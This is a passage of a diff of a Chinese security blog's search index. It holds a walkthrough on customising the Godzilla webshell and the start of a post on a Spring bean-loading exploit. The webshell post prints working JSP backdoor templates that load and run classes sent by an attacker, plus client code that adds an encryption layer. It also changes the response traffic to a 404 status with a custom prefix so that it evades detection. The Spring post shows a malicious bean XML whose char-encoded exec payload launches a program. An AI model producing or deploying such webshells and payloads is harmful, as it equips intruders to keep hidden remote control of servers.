String(functions.readInputStream(inputStream));</span><br><span class="line">                inputStream.close();</span><br><span class="line">                if (suffix.equals(SUFFIX[1])) &#123;</span><br><span class="line">                    globalCode = globalCode.replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;);</span><br><span class="line">                    code = code.replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                template = ApplicationContext.isGodMode() ? template.replace(&quot;&#123;globalCode&#125;&quot;, functions.stringToUnicode(globalCode)).replace(&quot;&#123;code&#125;&quot;, functions.stringToUnicode(code)) : template.replace(&quot;&#123;globalCode&#125;&quot;, globalCode).replace(&quot;&#123;code&#125;&quot;, code);</span><br><span class="line">                data = template.getBytes();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Log.error(e);</span><br><span class="line">        &#125;</span><br><span class="line">        return data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) &#123;</span><br><span class="line">        return shells.cryptions.JavaAesBase64_2.Generate.GenerateShellLoder(&quot;&quot;, pass, secretKey, isBin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里其实就是遍历template下的模版然后组合起来而已，要修改的地方就是目录结构下我们调用的函数因为目录名字变了需要改一下</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317162430268.png"
+                      class="" title="image-20250317162430268"
+                > 
+
+<h4 id="JavaAesBase64-2-java"><a href="#JavaAesBase64-2-java" class="headerlink" title="JavaAesBase64_2.java"></a>JavaAesBase64_2.java</h4><p>添加加密方式修改这里</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163409108.png"
+                      class="" title="image-20250317163409108"
+                > 
+
+<p>就会多一种加密方式</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163422068.png"
+                      class="" title="image-20250317163422068"
+                > 
+
+<p>这里不贴完整代码了，太长了，就多加一个base64的客户端加密，直接贴图</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">    public byte[] encode(byte[] data) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] encoded_Aes = this.encodeCipher.doFinal(data);</span><br><span class="line">            byte[] encoded_Base64_1 = functions.base64Encode(encoded_Aes);</span><br><span class="line">            return (this.pass + &quot;=&quot; + URLEncoder.encode(functions.base64EncodeToString(encoded_Base64_1))).getBytes();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Log.error(e);</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>根据原本的decode解密可以知道，decode的步骤是base64解密，再AES解密。所以我们修改的时候要把AES加密放在最前面，然后我们多加一步base64Encode()</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317162805975.png"
+                      class="" title="image-20250317162805975"
+                > 
+
+<p><strong>此时还没完</strong>！！！，前面说了客户端加密决定服务端接收参数的时候解密。所以我们服务端webshell接收的参数肯定也要多一次base64decode的解密</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163025906.png"
+                      class="" title="image-20250317163025906"
+                > 
+
+<p>这里就是多加了一次。</p>
+<h4 id="template-base64Code-bin"><a href="#template-base64Code-bin" class="headerlink" title="template&#x2F;base64Code.bin"></a>template&#x2F;base64Code.bin</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    // 获取请求参数并进行Base64解码</span><br><span class="line">    byte[] data = base64Decode(request.getParameter(&quot;pass&quot;));</span><br><span class="line">    data = base64Decode(data);</span><br><span class="line">    data = x(data, false);</span><br><span class="line"></span><br><span class="line">    // 检查session中是否存在&quot;payload&quot;属性</span><br><span class="line">    if (session.getAttribute(&quot;payload&quot;) == null) &#123;</span><br><span class="line">        // 如果不存在，创建一个新的X类实例并存储到session中</span><br><span class="line">        session.setAttribute(&quot;payload&quot;, new X(this.getClass().getClassLoader()).Q(data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 如果存在，执行以下逻辑</span><br><span class="line">        request.setAttribute(&quot;parameters&quot;, data);</span><br><span class="line"></span><br><span class="line">        // 创建一个ByteArrayOutputStream用于存储输出</span><br><span class="line">        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        // 从session中获取Class对象并创建其实例</span><br><span class="line">        Object f = ((Class) session.getAttribute(&quot;payload&quot;)).newInstance();</span><br><span class="line"></span><br><span class="line">        // 调用equals方法，可能用于触发某些逻辑</span><br><span class="line">        f.equals(arrOut);</span><br><span class="line">        f.equals(pageContext);</span><br><span class="line"></span><br><span class="line">        // 向响应中写入MD5值的前16位</span><br><span class="line">        response.getWriter().write(md5.substring(0, 16));</span><br><span class="line"></span><br><span class="line">        // 调用toString方法，可能用于触发某些逻辑</span><br><span class="line">        f.toString();</span><br><span class="line"></span><br><span class="line">        // 对arrOut的内容进行处理并进行Base64编码后写入响应</span><br><span class="line">        response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));</span><br><span class="line"></span><br><span class="line">        // 写入MD5值的后16位</span><br><span class="line">        response.getWriter().write(md5.substring(16));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    // 捕获异常，但不进行任何处理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="templates-base64GlobalCode-bin"><a href="#templates-base64GlobalCode-bin" class="headerlink" title="templates&#x2F;base64GlobalCode.bin"></a>templates&#x2F;base64GlobalCode.bin</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">String xc = &quot;&#123;secretKey&#125;&quot;;</span><br><span class="line">String pass = &quot;&#123;pass&#125;&quot;;</span><br><span class="line">String md5 = md5(pass + xc);</span><br><span class="line"></span><br><span class="line">class X extends ClassLoader &#123;</span><br><span class="line">    public X(ClassLoader z) &#123;</span><br><span class="line">        super(z);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Class Q(byte[] cb) &#123;</span><br><span class="line">        return super.defineClass(cb, 0, cb.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static String md5(String s) &#123;</span><br><span class="line">    String ret = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        java.security.MessageDigest m;</span><br><span class="line">        m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);</span><br><span class="line">        m.update(s.getBytes(), 0, s.length());</span><br><span class="line">        ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br><span class="line">public byte[] x(byte[] s, boolean m) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">        c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &quot;AES&quot;));</span><br><span class="line">        return c.doFinal(s);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public static String base64Encode(byte[] bs) throws Exception &#123;</span><br><span class="line">    Class base64;</span><br><span class="line">    String value = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        base64 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">        Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);</span><br><span class="line">        value = (String) Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            base64 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;);</span><br><span class="line">            Object Encoder = base64.newInstance();</span><br><span class="line">            value = (String) Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);</span><br><span class="line">        &#125; catch (Exception e2) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static byte[] base64Decode(String bs) throws Exception &#123;</span><br><span class="line">    Class base64;</span><br><span class="line">    byte[] value = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        base64 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">        Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);</span><br><span class="line">        value = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            base64 = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            Object decoder = base64.newInstance();</span><br><span class="line">            value = (byte[]) decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);</span><br><span class="line">        &#125; catch (Exception e2) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] base64Decode(byte[] bytes) &#123;</span><br><span class="line">            Class base64;</span><br><span class="line">            byte[] value = null;</span><br><span class="line">            Object decoder;</span><br><span class="line">            try &#123;</span><br><span class="line">                base64 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">                decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);</span><br><span class="line">                value = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, new Class[]&#123;byte[].class&#125;).invoke(decoder, new Object[]&#123;bytes&#125;);</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    base64 = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">                    decoder = base64.newInstance();</span><br><span class="line">                    value = (byte[]) decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[]&#123;String.class&#125;).invoke(decoder, new Object[]&#123;new String(bytes)&#125;);</span><br><span class="line">                &#125; catch (Exception e2) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return value;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="template-shell-jsp"><a href="#template-shell-jsp" class="headerlink" title="template&#x2F;shell.jsp"></a>template&#x2F;shell.jsp</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%!&#123;globalCode&#125;%&gt;&lt;%&#123;code&#125;%&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后编译运行，看看能否连接。因为客户端与服务端加解密如果之前有差错是不能进行连接的。会出现连接失败的。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163307114.png"
+                      class="" title="image-20250317163307114"
+                > 
+
+<p>生成一个默认的木马放到tomcat的服务器下</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163457842.png"
+                      class="" title="image-20250317163457842"
+                > 
+
+<p>我们设置了走burpsuite的代理。可以看看流量</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163536726.png"
+                      class="" title="image-20250317163536726"
+                > 
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MG1RVStTMXBGblR6M3R0VlRuQWdKVkQvYUJ3RDNOTlhMM1RmVEV4bzF3ZUt1NEtBaGhDdTZHbjFFUWZYMW05Zw%3D%3D </span><br></pre></td></tr></table></figure></div>
+
+<p>这里是我们的参数，经过AES加密，然后两次base64然后url编码。AES是二进制的流量，所以如果我们base64解码之后是乱码就可以知道我们加密成功</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163729074.png"
+                      class="" title="image-20250317163729074"
+                > 
+
+<h2 id="修改响应包的流量（404-响应参数初步修改）"><a href="#修改响应包的流量（404-响应参数初步修改）" class="headerlink" title="修改响应包的流量（404+响应参数初步修改）"></a>修改响应包的流量（404+响应参数初步修改）</h2><h3 id="404"><a href="#404" class="headerlink" title="404"></a>404</h3><p>我们现在的响应包是200状态码，我们可以尝试看看能不能让他为404</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317163954583.png"
+                      class="" title="image-20250317163954583"
+                > 
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317164051025.png"
+                      class="" title="image-20250317164051025"
+                > 
+
+<p>分析我们之前生成的代码这里是设置响应包的，响应包的参数前面是16位md5+加base64后的数据+16位md5</p>
+<p>我们尝试添加状态码</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">response.setStatus(404);</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317164354248.png"
+                      class="" title="image-20250317164354248"
+                > 
+
+<p>观察burpSuite的流量</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317164441932.png"
+                      class="" title="image-20250317164441932"
+                > 
+
+<p>这里查询了whoami我就给打码了，毕竟加密参数都给大家看到了。<strong>可以看到状态码是404</strong> </p>
+<h3 id="响应参数初步修改"><a href="#响应参数初步修改" class="headerlink" title="响应参数初步修改"></a>响应参数初步修改</h3><p>前面分析我们知道，客户端的解密是依据服务端的响应包加密，那我们先修改jsp里面的响应包内容</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317164736086.png"
+                      class="" title="image-20250317164736086"
+                >
+
+<p> 先随便想一下，例如map形式，key:value <strong>My only love: 数据</strong></p>
+<p>修改jsp代码</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317165220213.png"
+                      class="" title="image-20250317165220213"
+                > 
+
+<p>别的都注释掉了，就保留了404状态码和响应包的输出</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317165156279.png"
+                      class="" title="image-20250317165156279"
+                > 
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317165326856.png"
+                      class="" title="image-20250317165326856"
+                > 
+
+<p>这里没有数据的原因是我们客户端无法解密接收到的参数</p>
+<p>修改客户端的代码</p>
+<p>JavaAesBase64_2.java</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317165415450.png"
+                      class="" title="image-20250317165415450"
+                > 
+
+<p>客户端这里是可以从英文中看出寻找中间值，可以理解为我们之前就是md5+数据+md5，那提取中间的数据就好了，但是此时我们的是”My only love: 数据”，所以需要的是提取My only love:之后的字节</p>
+<p>修改之后的样子,这里修改重要的点就是传输类型，接受的是byte[]，但是最后返回的是string，参考原来的subMiddleStr</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172555975.png"
+                      class="" title="image-20250317172555975"
+                > 
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public String findStr(byte[] respResult) &#123;</span><br><span class="line">        String htmlString = new String(respResult);</span><br><span class="line">//        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);</span><br><span class="line">        // 检查是否包含 &quot;My only love:&quot;</span><br><span class="line">        String prefix = &quot;My only love:&quot;;</span><br><span class="line">        // 如果字符串为空，直接返回 null</span><br><span class="line">        if (htmlString.isEmpty()) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        // 提取 &quot;My only love:&quot; 之后的内容</span><br><span class="line">        if (htmlString.startsWith(prefix)) &#123;</span><br><span class="line">            return htmlString.substring(prefix.length());</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;Input does not start with &#x27;&quot; + prefix + &quot;&#x27;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172715962.png"
+                      class="" title="image-20250317172715962"
+                > 
+
+<p>然后我们编译尝试连接，顺便看看数据包</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172752324.png"
+                      class="" title="image-20250317172752324"
+                > 
+
+<p>执行whoami命令可以正确收到信息</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172835215.png"
+                      class="" title="image-20250317172835215"
+                > 
+
+<p>看看数据包</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172923918.png"
+                      class="" title="image-20250317172923918"
+                > 
+
+<p><strong>到此为止二开的一些基础操作步骤就完成了！！！，可以发挥想象力添加些参数以及响应包一些html格式去混淆流量</strong> </p>
+]]></content>
+      <categories>
+        <category>工具二次开发</category>
+      </categories>
+      <tags>
+        <tag>工具二次开发</tag>
+        <tag>godzilla</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>JNDI高版本绕过</title>
     <url>/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</url>
     <content><![CDATA[<p>高版本JDK在RMI和LDAP的<code>trustURLCodebase</code>都做了限制，从默认允许远程加载ObjectFactory变成了不允许。RMI是在6u132, 7u122, 8u113版本开始做了限制，LDAP是 11.0.1, 8u191, 7u201, 6u211版本开始做了限制</p>
@@ -1258,121 +1792,150 @@
 ]]></content>
   </entry>
   <entry>
-    <title>泛微ReceiveTodoRequestByXml_SQL注入漏洞</title>
-    <url>/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="接口跟踪分析"><a href="#接口跟踪分析" class="headerlink" title="接口跟踪分析"></a>接口跟踪分析</h2><img  
+    <title>spring框架bean加载漏洞</title>
+    <url>/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>在Spring框架中，<strong>Bean</strong> 是一个非常重要的概念，它是Spring框架的核心组件之一。以下是对Bean的详细解释：</p>
+<h3 id="1-Bean的定义"><a href="#1-Bean的定义" class="headerlink" title="1. Bean的定义"></a>1. Bean的定义</h3><p>Bean是Spring框架中被管理的对象，通常是一个普通的Java类（POJO，Plain Old Java Object）。Spring通过依赖注入（DI）和控制反转（IoC）的机制来管理这些对象的生命周期、依赖关系和配置信息。</p>
+<h3 id="2-Bean的作用"><a href="#2-Bean的作用" class="headerlink" title="2. Bean的作用"></a>2. Bean的作用</h3><p>Bean在Spring框架中扮演着多种角色：</p>
+<ul>
+<li><strong>业务逻辑实现</strong>：Bean可以是实现具体业务逻辑的类，例如Service层的类，负责处理业务流程。</li>
+<li><strong>数据访问</strong>：Bean可以是数据访问层的类，例如DAO（Data Access Object）类，用于与数据库进行交互。</li>
+<li><strong>配置管理</strong>：Bean可以是配置类，用于定义应用程序的配置信息。</li>
+<li><strong>工具类</strong>：Bean也可以是工具类，提供一些通用的功能，例如日志记录、文件操作等。</li>
+</ul>
+<h3 id="3-Bean的生命周期"><a href="#3-Bean的生命周期" class="headerlink" title="3. Bean的生命周期"></a>3. Bean的生命周期</h3><p>Spring框架对Bean的生命周期进行了严格的管理，主要包括以下几个阶段：</p>
+<ul>
+<li><strong>实例化</strong>：Spring容器根据配置信息创建Bean的实例。</li>
+<li><strong>属性赋值</strong>：Spring容器将配置文件中定义的属性值注入到Bean实例中。</li>
+<li><strong>初始化</strong>：如果Bean实现了<code>InitializingBean</code>接口或定义了<code>init-method</code>，Spring容器会调用初始化方法。</li>
+<li><strong>使用</strong>：Bean实例被应用程序使用，执行业务逻辑。</li>
+<li><strong>销毁</strong>：当Spring容器关闭时，如果Bean实现了<code>DisposableBean</code>接口或定义了<code>destroy-method</code>，Spring容器会调用销毁方法。</li>
+</ul>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>高版本的Spring框架需要<strong>JDK17</strong> </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt; &lt;!-- 替换为你的目标版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>一般spring系统都会带有相关的依赖可以支持我们通过xml文件去加载bean，依赖不一定是上面这个</p>
+<p><strong>能shell的类</strong> </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mvel&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mvel2&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.4.4.Final&lt;/version&gt; &lt;!-- 你可以根据需要选择其他版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里我选择MVEL，我前面文章也有写MVEL依赖如何实现命令执行，他有多种方式可以实现</p>
+<p>参考链接 <a href="https://ro0ki1.github.io/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/">https://ro0ki1.github.io/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</a> </p>
+<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.springframework.context.ApplicationContext;</span><br><span class="line">import org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line">public class Bean_test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;test.xml&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="漏洞xml配置文件"><a href="#漏洞xml配置文件" class="headerlink" title="漏洞xml配置文件"></a>漏洞xml配置文件</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;jndi&quot; class=&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot; init-method=&quot;getObject&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;targetObject&quot;&gt;</span><br><span class="line">            &lt;bean class=&quot;org.mvel2.sh.ShellSession&quot;/&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;targetMethod&quot; value=&quot;exec&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;arguments&quot;</span><br><span class="line">                  value=&quot;push Runtime.getRuntime().exec(String.valueOf((char)111)+String.valueOf((char)112)+String.valueOf((char)101)+String.valueOf((char)110)+String.valueOf((char)32)+String.valueOf((char)45)+String.valueOf((char)97)+String.valueOf((char)32)+String.valueOf((char)67)+String.valueOf((char)97)+String.valueOf((char)108)+String.valueOf((char)99)+String.valueOf((char)117)+String.valueOf((char)108)+String.valueOf((char)97)+String.valueOf((char)116)+String.valueOf((char)111)+String.valueOf((char)114));&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里先初步说一下重点。还没链子明白了再细说一下恶意文件怎么改</p>
+<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934498866-18a10609-e8e2-4300-8f28-0e040d94a1a0.png"
-                      class="" title="img"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315000112008.png"
+                      class="" title="image-20250315000112008"
                 > 
 
-<p>实例化函数没东西</p>
+<p>样例测试</p>
+<p>可以注意一下目录结构，加载文件是加载resources这个目录下的</p>
 <img  
                      lazyload
